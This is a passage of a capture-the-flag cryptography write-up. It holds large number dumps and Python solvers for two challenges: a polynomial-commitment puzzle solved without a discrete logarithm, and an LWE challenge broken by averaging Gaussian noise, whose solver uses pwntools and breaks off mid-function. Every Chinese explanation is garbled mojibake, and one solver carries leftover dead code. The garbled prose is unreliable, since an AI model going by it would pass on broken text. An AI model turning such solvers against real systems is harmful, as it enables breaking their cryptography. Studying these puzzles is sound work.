7755945381592732635225384097513976383854350364251173878325946474545694990086314166916314431272283230575982393452060505138278290183018494267015217296451g**(a**9)=421972326003139505006263252512659899510713380041485665748323773089073491404219930356060595435392264020923011394607335660444890004824599577635616121412253066259554441478640787881257231028862648105293507915304402258910207040306100366525227806742109918595673571551994272952533499144718163016574344195977785326998366939867652613657053985189305285701232413661747758514610214854542843864164192601578725306178625128499467598167652060689821785054975786813944814233675336g**(a**10)=1222499565395095112485302429729436630721792121050071052184641373949188317435480229852887983111054539368663153572968989271227024332504641394681075114509197221755395910366415425793231156194747270131373198129064930426532818243610710254805045863233985572772518898351210027965363297878990004695894011438994604140493707479218110419424437927758235776746350302046214962709541322609813196997485061835546098433333926990342882191376798058621978589869718944159122169152821833g**(a**11)=1311434642971797198670616396830489948283587479310472859515582891905747255209021461131202753399669135298737093243378930954579536738426966288116679640514686050908948620247740629370649892206051287405111537100597056291061107554419001014627033505211221669998986150101595871165398633389949076873026053265583452352434314143755795343332200283935793320395203653495032459154371222683611771489929623147377665033565782489463949552286242701682031803662548180153402710390994859g**(a**12)=537923048724306913667407759139091192645027606598311046000548547796991698984405486016463697946852730234553265033982453758097561723559435871028626304121501307482387420995739305402990605625514482774059358878453472977491682869062855937496286043123078558297311521808209090574271901886421438536457101475257587844454516455462087877211656574640247760256275523476747331878639859432764315245554388204289661687489841293394977800878056363245344564900463394368306785247423404g**(a**13)=51934925489063334787691610037014931455009887606610561005698200777907080694104820093865294502959771318908440224036860372440962333425683958284115243149646620909495838027781982845865942703574731265103534769824652022736262798167180403167801854693068724917191364493032544107480218634314594381331430403787813044675158312325080755018996909079697575467774620741120392160929982348047541052833075429981025030651220271486133138449231018092265633711192333262554599858975790g**(a**14)=1059964490529061044621075245304711172283591486685719943019579108698788079419318476702227133958427144632656851447006147314896029428313396097413692125262883169018066362511928680751967685741555993422295045796342490666810860026142323225352194442264842083457859123969012711367831112521263388612795861927778785730135795288931784680106041353116384313399571176514941720321869582402300524552855540517034209029475413412896665856894177364544381995125614424320466500734459871g**(a**15)=748385386217854935591238417343557224972257645351648875976502391496690810947305076266710823054183276352159275738637228330763370087767661401157158470945881293277204890742137584345215800941470815743527808133917953609613870580960746761392706596255693023985691720896911329242178574550812688838178481238489835231629746415143623476473598997000523012581793788842371211730882732900645357579058393975219277009174524520280511266408134112985441783868970923296165449587664923g**(a**16)=1144448615708305683367614959915199438212309537678412026397275803646472944907429096875465647722527428169614867535293295561711954517125913195674324280344197817048577981322088532198897041387229367290460448623051013498385132197917166310706467904805169182570304278296873874500462900394168265425958391676959509638562554823841219952130066338997665748730397359489630135907276115185691293970630133016237249884808857190097615154402892863133383178216245658051135961350643581g**(a**17)=519188105619163515401003905502167597210405994657781949994211268658972829772613733502880941470538036965280382486199640246526002493625019854634814417194664649304504058370312636801626139001046322181862501968236766929101150276749559428633534773907145224779284134475879841524833257902364126918908314133870646280667021943247767907697269197432112566419115037577760360119881815686746335810590470529897944196178121473754751278224110431476971810370910744758902056845129612g**(a**18)=935112938925517166210302846307923841118290311190122824544200250081783015165714029356660494494639204089140892705793060712560002233812928950051086675155848625903148508451801749411118374682074606612846386365909794972697988325020490051600999229672834676964401189555303543350462536636624292934168397551989066401993395896589081245536270379442859621475616301285689705122045639223646348735601311391993105745759121097908338402469382081260349161891803984169930653200685746g**(a**19)=548475273082982186157181212361100468189379734161575863840706276469937286657448242985373547915777881107373533384909353280565886826650779510963622704468591175047518154417154838959939350582232188280387401496582333797482451611435432489775253278296864886323232050190896555949513813594437903076591072997989600518824696385370916212349780132957000507160006094327270008443036471032102608363205734165931198836823681674747765717984189332825368849955328791192505235869020084g**(a**20)=551418139474283597501444419494433495198489650939051396736883923545642849344992850132684528803691695842949664145322978009676095728729002378360736423202281103078015710447676693409984728957044913008095174735761259428545095087464402068116543140388162970634210643236322006874993575260656444124679207665339803565254297121113876116665882766665547675863916077740268941755524701437422005179306355218810962660239513820551002058204053356297256869285906939172759640705574458g**(a**21)=502621180601298750146001307590253204130057827493515613021492222788958053941619170394876832814044143880887271964304058946389006311314544451768892655027096738574521410475122090066757563550995149053001732011656911982307921208045909677546877423707634933383842709714688256567184435090994887464645829108436950805846393513512559777091365041180986775236762647522055258709431530268694699038522542618923538862676400081514671231015216565519714130383251559145783658076138720g**(a**22)=590369198372118425912810991010485023815390035406147827833543423641107521223899254934435731382676078086864712057701855040827276458881688945884834913141481699135731341478968715703066400103137625865862188101361591773648336194531451507902183094338624872982832176863225243680756610197063501697402836184333636267798515181433534007384328264257757543920527787843744809153893603948991727649089001426544952810767692271627995856222566185074109407748401347488858544790874081g**(a**23)=936456359793313027616063607381869012793653415394241515387689721003705117368878095252583867106250359499949604552432632222785262345408354245846939624000323750136597189141725707744494566964377740738134990093048631149345764960238099823859472875118439081366423063323288111624196451952899261257101613483743704732997732497074377277839875521736763673456891987845034471103370287173410726486127140512476120487290664733302680415153887520218881361630116070608015521749986106g**(a**24)=876017570082281714452562562517192460475528856157405023231719832098441979971374776636785477720713179982594810879826104451343336951239688333676382042928408179525069918871773235509459222603444506933119199321932654845736928819272289564578859144747889338604656452298674151007468885266132083800958339974229722032133195901667326134336801006373888564193988091993775544155281225403417940576378334463527133721338436812145138349870834202524386397552299975535545468966709723g**(a**25)=960376978595267613144287493989799724447813083338682902878108553470543856544878091119077387567993120935576984733124138926452721851076431648275772852332287779949916239285783713112459128279462617423286271650197186898780986487093047743204502835716768627602821937663740885272653094223878423720148563569254453320773022433997089262819209065125663676836324224935646855434365398247947776544533847147820385991274387179052411067002687173444929606852953939230362582478395010g**(a**26)=66200087876254518536928624370696569002012793265298084876288094182852628438535829277583215180406761282898615642202024935576744758604404185203671550916851401268100298751280145218751431117902184159895675800216603268997090854153519463136195537685767019086978749337031375263951996786656572786095983123734611929316310027492381317803727408194599069722267246492421670888858669954731125135153911787522942719468579668064151616263961464490469749331485680868886931922419543g**(a**27)=738626174890972808654948227097907261548667257080118534725542687928649211520653485997481331562567396343462649117799083053838961381153791195444162894991103371779152957280970428258576948186508339356662429720726538516603943269958839071539959617733179811022475120940740123195676733990313550472268799571864041568807490920352481649899126872818752736715827969948069060992145624504152913762221355835587600808339435979712632311736590401599267898909113966238585918338714724g**(a**28)=1153271535924581584865912531724749863403952944584374600720665312148792901205701658353777893933249136553581284629818646765752113279282257190150565851900592891696805781797891943293488757716379760870439345710686267674624336460269375778043278672034664071105739412674372349585541378645380587643109198207913915889112423877115103898457139736432256280087852655730374486090130914611030772292584938245831847231281421517608954805508689358057555416468656644314739330891771031g**(a**29)=344901461096144427589313337546747849771160756250959061450006050796385595868221560845608237047221068425487831811411831825296962097097086388396996149337634844759366466727633494255074996462348072188317333476260292087432752948696100179896985764609897603721950508981254991262293580564361781625741402742804144078076972500046535791920605219483279996074303592650906168304363049685575340485274958152651513404257351358266622716733291100831407409336028601722820939182516040g**(a**30)=793673029460896041274559448248336092616717496749831152719812839109861483362272977453075324485303018789203875343899797950063380529181291244233016464073246395804422493935571322774152632011110138957740182122399867799407300461813519283846859078535262101606601728886109697525773295093495702177576564575582514537961268001574085894815685935623742131762892890761612141803803800502145632369726698300201238513257059379130421732587353875695453704922589136297719884486974025g**(a**31)=428772031776287493744087145031754991696569812226062610761799789298229338459221834830145099601453047413711969397548792333170088298734758902082335630779619674150343672393443954024121372765297950202859530605650576587065370060411262958488833009256886744366553719544310262293106501639334291948314028979506550154444321139711129553623008750609139908928385511354396556293002784347448717713780653481212021244181948581109238554291162066561086840975635769212375830418588207g**(a**32)=84856712940106742827524062220998120012440967380597883991358955796298526457311376380505605929724785451343348415993054273779507836372853593200442437140098269333363007640338496484744083087929008614743772135430950687378504182897502287479768182067788559420718218414834030437838199723232681051397059776431246002228293945595083742116766846037492664058767920226983165795624912301783529498348623501235354285374477982621667542272330037965600321997129457067893051477801604g**(a**33)=67959176885831100137525427303555428018736219245535597045450635734270064268576290803159652776939277843782871935621444121350187155061426824188600966037207694001470419141704677453432014302065263904722961845017540245686878384249852063339892492949814377762999068366027619323759826057027361535593083556036625938346815170479492128440685859436644717763618303905459273690242815409684580177212329616779008300967216682047980637888427753451288701407166654910077519851140556g**(a**34)=804103726363432192260118340952503171349862949065439294936483279716578602135164325758239694194987097420148353707615023938585091434207778705302611197781745716414903149888019266171059461070634615867076047713100333778133518057523330868956348377943369625608937844861826768025052057390921597717706795692044101174622962834491667267773285234212149579864645983043832882181953984427121670775287792315559244084606000031799735367104672509353593019388616521240910382110006396g**(a**35)=531875408711256942353413793058527894165133847151885797621970057983012043688378529303908786980751157249564573446671231264707861704125415717937403689971649527371556696615604156541734556536210054923675394510072854843732925485822929521090488870744899954252755657776501791014817182278554646928137253361598191617456265323040271077804299693527548084019393289641591004704626158616309814653031686252177629665385840455143086880112788273794745794187246380763220394887918939g**(a**36)=827445271740921355526699058045285395871466807915354333676929431949080042439537246197793572265170584598090101932759170709951175985620786463665577744886800077796531808526426998925787015356970789630573411118505387461200919292255435173194991514782973728212817530971330711298760895206982958857102219196783231336189873468273010411831769736140032994067354349287648338403843791730921196698852777331105775924622426292971718333706854023838824607577924640115751032397829970g**(a**37)=443090931570517831699639459175968330334741224680232681035120054045845163809889080534889222501520669666611409111321446063483465753584685264960581001888767886615965017242505306671063927023080654887281304810276101192956926894713627343813619366789038770613641907264635658091105348836931745524490666634572925096922819182697948202984665348293059629441575761171749021283082092941710494991638516438167348812429101772817749037541391729785751422351817676310812385805550587g**(a**38)=155248215849414225912461037949981608956128014326160654478003597965979982677461545230463382381206136744119807545562135420849979490833436828190378111387324848564504865827482221244915388634991394232762703089561054784189883876592698120228031216552136096405528397407215125957678160477176157621243892511272826912458654045182691852103414403259118403681030803864278813440054488946900094473067620413895347721647244717691313600912217829028513932124045659208672012907880030g**(a**39)=399845080198085797945702516393194696985604725913751282083546685460552459819220939115836450459937889426776731242168490586568194143825746525570954926451733597544652823627429697939871732958784578132865771299846927840862394385051731515291706868586541872828599511037294558084944373725411349473647947356672488468102147579400451475822400057598515338281788872329571050338401509518275207943713032674042000896490555476351057203398307904826491985993046958320704471424510973g**(a**40)=980210539885588169096390435467017261877974733122531504706590831886775630314164870768319893599896960147821836012739726380050053203765218407889473694173945795598872379374817234346104047224790925769266935555914614096363711337918259398881603334424055976401195687876077569494902246790578471586080314947182160282953288207765618098079462034737087098461177456318219063680629969646815247737604842428031309536119441112165816966919632162739700326917263084564777324653147503g**(a**41)=405644197879305978439098028411677849990382806393895795896375057488506843883312320546022267807344795869823423362015626855469592913627547333021290729644830761065619252952300948305371436060919199483101532348202879032687916676954260718927162838771661564140622477927427614164218413450773648633520200113983192262309991072742592077422413278144996694059066063030019924362091038211281658608848187656505772228837213406267701010643603299569090894003826881587172508203088600g**(a**42)=462397880377877250478643241519431833264009140574215681551875487431349800516205283725499900916796303275993189512286634500098379661596889697590344103077809011344732869138686353679676630437982800055810698496823827798800960288988076311949287027676368530806908044739007280464493557002153408089177602230726847113096082051799289946670255307049620223246700871774744837726277936388182394262038599792186009582464628800819437334618664008687810725096342615294705598886658450g**(a**43)=354949424597359862122250787814043050477698547148628596501477873578637363130297393837477089525877289512495446591705879014864055390509555552540750306844125802839558338765062448598562532447852652869554821223052468217773239420649380628776089904598947623230168726675278414037860915681843781508899886792493632222545792263714414596255249068425151101353361474472798292234618159453929910178914209610093490903397369156700153061743945663342346840445188261294785229528530844g**(a**44)=740119252506315644766028515696701569130434786355436104723808504805034786233335915229889313555501789611712266813495538727557134284138785600530812727320228468656287266295358090627710145827353658057205848500774761570687461066359089520224779185764614812111985288256493335430658959879714743008033989101678115807659714899452992317993448181603712047337011012166423332911413260245930001884795531443808116446484327766300829558040176341873275667767587138845629673443660740g**(a**45)=587444755599165037234544260959361900703267772818992941343456192977831869707326360848988621969395282889347827433121120544624972461462181931232625067352848999079109460414138643203147742240238970389247295361565823157032813784353099614430614800827758127579931880063518371346605577041774238929689798096176699945369680643326475263561188458474567379359110756280084868973208705153497352846938984111514989084539206462146446189203901960109248230793410504957558033397381891g**(a**46)=214950195981674255528510492090216374960348569295906671744974712971299106029003208993667001054206247502383530049028460477237701017692194753871833079539777396398323494018272883314465895354265088621266629516195583525431290173472730665183816814223360260994793676128499779597318427274974372517674801177039212690835398230686277561637312491718177523099574349512311947417146574083587982828230561551265966876669798442960465798732815834931780197155466262390837423916877989g**(a**47)=907692958855183650048720382902403853357765077137027494938810883600038809484763796470426511940415912851198923116365500287253269578203005493942056077450680396363271261626243221244931515669702948375996386010670693864786858713086075911203385251176386031908804568509481061347993122561503311012586222249962155912834667295538124606803960527275918000245528468670462853242516288323781169440456785589278032500817946684546306672783697003300673578575641376308219526758391043g**(a**48)=297683220662024877839207798482187870938723182974553380410862299251363956963542962780746098613606635176894638479247549026002980743169864533338193886525259860571735472053505784728435847340918622606542122109892520652154800527054096805994547745752172153604013201041842708349200213461861331818446933298587880334241202215410832954945890642642124277491632421565295343688943238291467333944442966488187798938023879891550950544237453987688388437756656363385723672988375252g**(a**49)=1003631491891180306573004210706225960617707425511295258191004462263767729554111769116239103344828703827490660113561892710125103577360768779966204439949269573561338711670174440253919586257636573828252756530329938054580861461730335920848612252580199542401617563380422567459471394717554132773878347723387145040604023073055895766942546532658374399234641069539876980731448310093816544507705343196961633423791885229249934743736451216760280064429225722237425609454612167g**(a**50)=325374987652087123036989880143325988658999945157707128756576635045690535744463268816197239707295541434297026587206313074994474448924690649910134293537592534067558743152889245183167161264866375745018775457217643071912156029183253899973160253079092310065847503747815072867351479215879423387999174953553280358467624190301160060047883247386281807287291602498546079052700329738732440368384507971451291591785861135886084258400667486133532339534516028456284444801596416g**(a**51)=1140476184297388138992406645699008127721817608298958874613261198040388630848767227415451150859083185004383099152797780818851917701682816420034250759051636516914368467193667684665291068700454460332809338732606409424966919394115140907078679849054662202219809711848541365481412125149042620129322730267248369172692362636454646567239266231078384932423220186646972630259332289783545755496225856485794385593380306703356739952499521138020590939976394312431012271533062665g**(a**52)=656312741735093616791054951932732287820326500731952413484616167778034303950991676857246724559014358401544803707575336473559409460959231147962128976609195358504369619204017952922870459009274270314136081580005233678119437792426114870065616248560083505986000948569253963561034767295827020663464884295522081502809068523159979854526004561825987620737631423006998054092036384010598069011791825175839076791058943952748040399449823430212199050992882386199179882027106616g**(a**53)=925172084650234952738055129778957670682933320881588358623389855877719415066724012348061915348588844367074877821288291471546865809225406454050290900416103255691782832536769141667375900811403278963963069581769084420480651253502278631464273437869971419790624746903323018195522774398943554633922280057975813568887038008674796493600062310584304894838026969119589236210360210152105225076251441729895376654827899192484699925258708251880634009071999891001867429943964032g**(a**54)=220250020897108805887206098533293919980124555685379538428378029139404569774745913427801360443291041129903871132458106872045155123984592998499304646177465142409089794299148829525910649148463095419652148816297866812539670932291323937749881388604494863155012320767252873274305405913278806229350053700428598121180160775562244970073589400191463043291403576236308017225795383941450561314077815059172111073697256386958899522056278956968623941773712561270948471728348710g**(a**55)=393999833495115547744681551803664476157560614643370934180974649057520760887228197708980306871084144622074373209895546623386926234343194859418743929159219548263037006225663531305489363796037564626406354331573994981953643304674151497358852540752175714852367759085323809266000562851287313655420658576145746795710907827427356171504066066802624192025178891852197765419647923140881785312535529967995088973500970722404979313479925311268572162960477419630943655965290372g**(a**56)=829282976613829241836360081395554852962732429607153704646645995307031916001802206305447266438419273931599615742369558644731811781283222164063932095191723020760155750380124576214149478913131869764550489069379913074649749664591153526027447084780769090354538835585753750366865198583836297508730095101638827662707791938686982107672906311674056680297949035001258977555414909327385886755258368047500773710872151223643117325192877894074180410746125027556896270138128665g**(a**57)=610819890290711468033475535094087815032949147974911400723601709023474981495189053152546688377535410651006266104524745849573586152275900525851625730261466480483243410583629704181870117770734008317355880683343660833765260975949030418394668747407456022493944462424120379353064369895731489808741165176887419680889657146998526426008360717267951925210739916408361024535363558785076769707251526759955257960865557465764244876530493147823927889718436331306593432838379040g**(a**58)=318850745582068097779943290144271530871137621466613932333191713300321180949000245282523790350013233634204171204482180938688204421810388715430302620535038145226777055603202924710958880874404286393108350181215699621303955091713089264754324219664838086626764514774417205006478813242227272390460118692998540056768207772858159577670993262673446886046570112261967502572948703163932936495072110278282834532853732874436047450667379801470723656269961237067528778510180755g**(a**59)=1122792721631351470179929182324553266448623427014373487882048645825575340837193808251659060043833466771113943725924580361858895767915264785381041897367348311966271017453566701517361243105352230452959260827542126639628111896847853563754758433397142676377584324635693500927803161749620609647535865366051098736833145574728087330523181070131784594904915887388010318332385819496967124027080196849770435064874582417928053271710324117954885741819791025860580166869815960g**(a**60)=1198341195044316977871293142286393468985061539560784855396424883808296494166708660945504068893587668488346383959074330675893985737312497384956111125543924790597238916500533233122584710378247668551965032541158560346678885690144633910593395591264594619938443339120666623751985506372809068009179674526796793769132184773316015300493965953608634939223836307127061546527291444586584697284666643882919027239606523828904492495459518536586842883059716593195840393204088268g**(a**61)=425613006174454621043040256283798129738903376549275431172623116813334328370671138733694287135573684854037043422367669347540891937462402284384310150467276819050998215941581994127886906102366435874080667918279564421990866766702894178060548736157209995837220432037559598911265870386231049369674261921711299656308862115458659269665301252327384357195152388593155730485786548023004515196181426599810975532272294482141394570759717376717932081093532174316791009087192119g**(a**62)=1003035821484901261398551405257709434421542836569858054683925336860426408559624782305239569732859961673418528110330262755197472197730343310060107852266015698863868354725824425032406970692489867105165902404146138825531577731445742495405487877113660208536628993739547743893098233580015527536150979545641900804510337891732921927222017790621240568285568139353659201082514818111445948666905967690976866166955546505804024932564594378772665772981409265343969893124310109g**(a**63)=37525322936755048315882119994559362887824342971957364906086459066339011954691340600895919441622827833793684131246886131195113253902782124645675128102681097754644053645764447407529941903076024968226413070562943759896139897262164803755034530007328563583568902686089984830282385017821806257814311115286981288779315869250980880272929717345006222576894352323284593217762659503032598327805075131463299906671253935914683123889561131874239272845599910332871027890790144f(x)=[3934037848507671313, 7163312440213743020, 1068067828677487962, 9616620236663402198, 14951618567612202523, 5334170476138375532, 14971011628799520066, 12470950981148026402, 16778289845018139910, 5075433041073653995, 10171366812423342519, 7134453661695517527, 1584005709598343161, 17210552426288878964, 2314627402522280395, 11362601988248461497, 13179596664295877028, 1358037207622978029, 6458206237141684189, 17568308030296233439, 17154706144454408109, 6875564471403626408, 1771604993142756552, 10339548719958797491, 14407467898400355560, 5599902096698060784, 4148799300143558141, 7345464900339496536, 17693994879008128495, 10766110118668126313, 12500034033305150349, 4457893228807565879, 14648055482349088869, 16315748015072253921, 6550449953921826664, 8057454229515379986, 11370550603309033686, 11678889446207658939, 18087211198918507041, 10948146701948076351, 10905595498702201889, 15444051280851702335, 7831774819340999530, 4480572439027389580, 236498351852774316, 17650395434174515592, 6116603661114741898, 15639816378402914561, 13088272613342466078, 3978133073068303466, 12764307904654676017, 14132959511909711831, 1306551887929068874, 7483942877683344008, 12997264192070987777, 1839571799345402709, 14255935456893399536, 6378166789705343797, 9401818515244771415, 8129855470171530502, 14567483947603058439, 17020853258928901347, 2051671117276556324, 1]w=40993545634119819077665955143471342240695426497061432211475913240267962059404198946360769569537631127237643976799614036958944381869519592837391556404040618139821571439843664787471723461677277303687445815567341782595991697961752411538123687502649593031958408998509020421824977151718636145450796900133369000294841463015409434396823741877746904263732441858346789161197665703554260326990098099688570528579836788994638224662614971618219698943181016106445651564642794g**(f(a)/(a-w))=394073585332862514268519676411808592018813469914740771725830965799163939991616455328992904840104904360794900299056676762474469741947032620742676750435958542254984866654529722552948877909416094454739676230767521159762137367060495586714410658098442773373837551670393617235158333332957413175914416775393732150819219678303508675579346387103469464645167722405250480108314561401565333158479779046794530078848275402942254471032678062752518876101637253141745052148198020\nå‡‘æ•°å­—å°æ¸¸æˆï¼ˆï¼‰ChatGPTæ¯”è¾ƒæ“…é•¿è¿™ä¸ªï¼Œå®ƒå¯ä»¥æ³¨æ„åˆ°pæ˜¯ä¸€ä¸ªå®‰å…¨ç´ æ•°ï¼ˆ2*å¤§è´¨æ•°+1ï¼‰ï¼Œå…¶ä¸­é‚£ä¸ªå¤§è´¨æ•°å°±æ˜¯qã€‚åŒæ—¶ï¼Œåˆ†è§£qä¹Ÿå¾ˆå›°éš¾ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç¡¬æ±‚ç¦»æ•£å¯¹æ•°ï¼Œéœ€è¦åˆ©ç”¨ç»™å‡ºçš„$g^{a^i},\\,f(x),\\,w$å’Œ$g^{f(a)\\times(a-w)^{-1}}\\bmod p$ï¼Œæ±‚è§£$\\text{ANS}=g^{(a-w)^{-1}}\\bmod p$ã€‚\nChatGPTæ³¨æ„åˆ°ï¼Œå› ä¸º$f(w)\\neq 0$ï¼Œå› æ­¤ä¸€å®šå­˜åœ¨æ¨¡qçš„é€†å…ƒ$f(w)^{-1}$ï¼Œä½¿å¾—$A(x)=1-f(w)^{-1}\\times f(x)$åœ¨$x=w$å¤„ä¸º0ï¼Œå› æ­¤$w$æ˜¯è¯¥å¤šé¡¹å¼çš„ä¸€ä¸ªæ ¹ï¼Œè®¾å‰©ä½™éƒ¨åˆ†ä¸º$s(x)$ï¼Œåˆ™æœ‰$s(x)(x-w)=1-f(w)^{-1}\\times f(x)$ã€‚ç”±äº$a=w$çš„æ¦‚ç‡æå°ï¼Œæˆ‘ä»¬ç›´æ¥å–$x=a$ï¼Œåˆ™$(a-w)$æœ‰æ¨¡qçš„é€†å…ƒï¼Œå³ï¼š\ns(a)(a-w)=1-f(w)^{-1}\\times f(a),\\;\\;s(a)=(a-w)^{-1}-f(w)^{-1}(a-w)^{-1}f(a)ç”±äº$A(x)$å’Œ$w$æˆ‘ä»¬å®Œå…¨çŸ¥é“ï¼Œå› æ­¤æˆ‘ä»¬çŸ¥é“$s(x)$å¯ä»¥å¦‚ä½•æ‹†è§£ä¸ºè‹¥å¹²ä¸ª$a^i$ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬æœ‰\ns(a)=\\sum^{63}_{i=0} c_ia^i=(a-w)^{-1}-f(w)^{-1}(a-w)^{-1}f(a)å°†ä¸¤è¾¹ä½œä¸ºgçš„æŒ‡æ•°ï¼Œå³\ng^{(a-w)^{-1}}= g^{\\sum^{63}_{i=0} c_ia^i}\\times (g^{f(a)\\times (a-w)^{-1}})^{f(w)^{-1}} = (\\prod^{63}_{i=0} (g^{a^i})^{c_i}) \\times (g^{f(a)\\times (a-w)^{-1}})^{f(w)^{-1}}è¿™æ ·æˆ‘ä»¬å°±ç»•è¿‡äº†ç¦»æ•£å¯¹æ•°æ±‚è§£$a$çš„æ­¥éª¤ï¼Œä¸éœ€è¦$a$çš„å…·ä½“å€¼ä¹Ÿæ±‚å‡ºäº†$\\text{ANS}$ã€‚\nfrom math import ceilfrom functools import reducedef modinv(x, m):    return pow(x, m-2, m) if m and (m &amp; 1) else pow(x, -1, m)def poly_mul(a, b, mod):    # multiply polynomials a,b (lists low-&gt;high)    res = [0]*(len(a)+len(b)-1)    for i, ai in enumerate(a):        for j, bj in enumerate(b):            res[i+j] = (res[i+j] + ai*bj) % mod    return resdef poly_add(a, b, mod):    n = max(len(a), len(b))    res = [0]*n    for i in range(n):        ai = a[i] if i &lt; len(a) else 0        bi = b[i] if i &lt; len(b) else 0        res[i] = (ai + bi) % mod    return resdef poly_scale(a, c, mod):    return [ (ai * c) % mod for ai in a ]def poly_sub(a, b, mod):    n = max(len(a), len(b))    res = [0]*n    for i in range(n):        ai = a[i] if i &lt; len(a) else 0        bi = b[i] if i &lt; len(b) else 0        res[i] = (ai - bi) % mod    return resdef poly_div_by_linear(numer, w, mod):    # divide numer(x) by (x - w) over F_mod, return quotient (assume remainder 0)    # numer and quotient represented as lists [c0, c1, ..., c_d] (low-&gt;high)    # synthetic division:    d = len(numer)-1    quot = [0]*d    # synthetic: start from highest coeff    cur = numer[-1]    quot[d-1] = cur    for i in range(d-1, 0, -1):        # next cur = numer[i-1] + cur * w        cur = (numer[i-1] + cur * w) % mod        quot[i-1] = cur    # after loop, remainder = numer[0] + cur * w mod mod    remainder = cur * w % mod    # Instead of risk, do straightforward polynomial long division for degree small:    # Simpler robust method below:    numer_copy = numer[:]    quot = [0]*(len(numer)-1)    for k in range(len(quot)-1, -1, -1):        coeff = numer_copy[k+1]        quot[k] = coeff        # subtract coeff*(x-w) shifted by k        numer_copy[k+1] = (numer_copy[k+1] - coeff) % mod        numer_copy[k] = (numer_copy[k] + coeff * w) % mod    if numer_copy[0] % mod != 0:        raise ValueError(&quot;Division remainder non-zero; check inputs&quot;)    return quot  # low-&gt;high, degree = len(numer)-2def compute_ANS_from_outputs(X_list, f_list, w, T, p, q):    # X_list length 64, f_list length 64    # Compute f(w) mod q:    fw = 0    poww = 1    for coeff in f_list:        fw = (fw + coeff * poww) % q        poww = (poww * w) % q    if fw % q == 0:        raise ValueError(&quot;fw == 0 (degenerate)&quot;)    t0 = modinv(fw, q)  # t0 = f(w)^&#123;-1&#125; mod q    # build polynomial 1 - t0 * f(x)  as list low-&gt;high    numer = [0]* (len(f_list)+1)    numer[0] = 1 % q    for i, coeff in enumerate(f_list):        numer[i] = (numer[i] - (t0 * coeff) ) % q    # numer currently length 65, but high coeff may be zero; reduce trailing zeros:    while len(numer) &gt; 1 and numer[-1] == 0:        numer.pop()    # divide numer by (x - w) to get s(x)    s_coeffs = poly_div_by_linear(numer, w % q, q)  # length up to 64-1 = 63    # compute g^&#123;s(a)&#125; via X_list and s_coeffs:    g_s_a = 1    for i, si in enumerate(s_coeffs):        if si % q == 0:            continue        g_s_a = (g_s_a * pow(X_list[i], si % q, p)) % p    # if s has constant term beyond s_coeffs length, check; poly_div_by_linear returns deg &lt;=62    # compute ANS = T^&#123;t0&#125; * g_s_a mod p    ANS = (pow(T, t0, p) * g_s_a) % p    return ANScompute_ANS_from_outputs(X_list, f_list, w, T, p, q)#åœ¨æœ€åçš„è°ƒç”¨ä¸­ï¼ŒX_listä¸ºg^a^iï¼Œf_listä¸ºf(x)ï¼ŒTä¸ºg**(f(a)/(a-w))\n04-Broadcast_1import random as random2import osfrom sage.all import *from sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler as DGDISn=128p=31337D=DGDIS(sigma=1) #Generate the discrete gaussian distribution with sigma = 1flag=os.getenv(&#x27;GZCTF_FLAG&#x27;)+&#x27;&#x27;.join([random2.choice(&#x27;0123456789ABCDEGHJK&#x27;)for _ in range(n)])seedA=&#x27;&#x27;.join([random2.choice(&#x27;0123456789ABCDEFGHJK&#x27;) for _ in range(24)])print(&#x27;Public Seed:&#x27;+seedA)rng=random2.Random()rng.seed(seedA.encode())while(1):    A=matrix(Zmod(p),[[rng.randint(0,99) for _ in range(n)]for __ in range(n)])    if(A.rank()==n):        breakrng.seed(os.urandom(48))s=vector(Zmod(p),[rng.randrange(200,p-200,200)+ord(flag[i]) for i in range(n)])for i in range(548*2):    op=int(input(&#x27;Give me your choice&gt;&#x27;))    if(op==1):        e=vector(Zmod(p),[D() for _ in range(n)])        print(list(A*s+e))    else:        break\nä¸€ä¸ªç®€å•çš„LWEåŠ å¯†ï¼Œå³å·²çŸ¥$As+e=b$ä¸­çš„$A$å’Œ$b$ï¼Œæ±‚è§£$s$ã€‚æœ¬é¢˜ä¸­å¯ä»¥è·å–å¤šæ¬¡åŠ å¯†ï¼Œä¸”æ¯æ¬¡$A$éƒ½ä¸å˜ï¼Œ$s$ä¹Ÿæ²¡æœ‰æ”¹å˜ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨è¿™é‡Œ$e$çš„ç»Ÿè®¡å­¦æ€§è´¨ã€‚$e$æœä»$\\sigma=1$çš„é«˜æ–¯åˆ†å¸ƒï¼Œå› æ­¤$e$çš„å‡å€¼ä¸º0ï¼Œä¸”å¤§é‡çš„$e$åªæ˜¯Â±1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œæ”¶é›†è¶³å¤Ÿå¤šçš„åŠ å¯†ï¼Œå¯¹$b$æ±‚å¹³å‡å³å¯æ¶ˆé™¤$e$ï¼Œå¾—åˆ°çº¯å‡€çš„$As=bâ€™$ï¼Œç”±äºé¢˜ç›®è¦æ±‚$A$æ»¡ç§©ï¼Œæ•…å¯ä»¥æ±‚å¾—$s=A^{-1}bâ€™$ã€‚\nä»¥åŠæˆ‘æ„Ÿè§‰sageè‚¯å®šæœ‰ç›¸å…³çš„å‡½æ•°ï¼Œåªæ˜¯AIä¸çŸ¥é“ï¼Œæ²¡æœ‰ç”¨ï¼Œå¯¼è‡´çŸ©é˜µæ±‚é€†å äº†expçš„å¥½ä¸€éƒ¨åˆ†ï¼Œè¿™å¯¹å—ã€‚\nimport sysimport astimport refrom pwn import remoteimport randomp = 31337n = 128QUERIES = 400# ---------------- modular linear algebra ----------------def mat_mod_inv(mat, p):    # mat: list of n rows, each row is list length n, elements ints 0..p-1    n = len(mat)    # build augmented matrix [mat | I]    aug = [ [ (mat[i][j] % p) for j in range(n) ] + [1 if i==j else 0 for j in range(n)] for i in range(n) ]    # Gaussian elimination    for col in range(n):        # find pivot        pivot = None        for r in range(col, n):            if aug[r][col] % p != 0:                pivot = r; break        if pivot is None:            raise ValueError(&quot;singular&quot;)        # swap        if pivot != col:            aug[col], aug[pivot] = aug[pivot], aug[col]        inv_pivot = pow(aug[col][col], -1, p)        # normalize pivot row        for j in range(2*n):            aug[col][j] = (aug[col][j] * inv_pivot) % p        # eliminate other rows        for r in range(n):            if r == col: continue            factor = aug[r][col]            if factor % p == 0: continue            for j in range(col, 2*n):                aug[r][j] = (aug[r][j] - factor * aug[col][j]) % p    # extract inverse    inv = [ row[n:] for row in aug ]    return invdef mat_vec_mul(mat, vec, p):    n = len(mat)    return [ sum((mat[i][j]*vec[j]) for j in range(n)) % p for i in range(n) ]# ---------------- estimate b per-coordinate from many samples ----------------def estimate_b_from_samples(coord_samples, p):    # 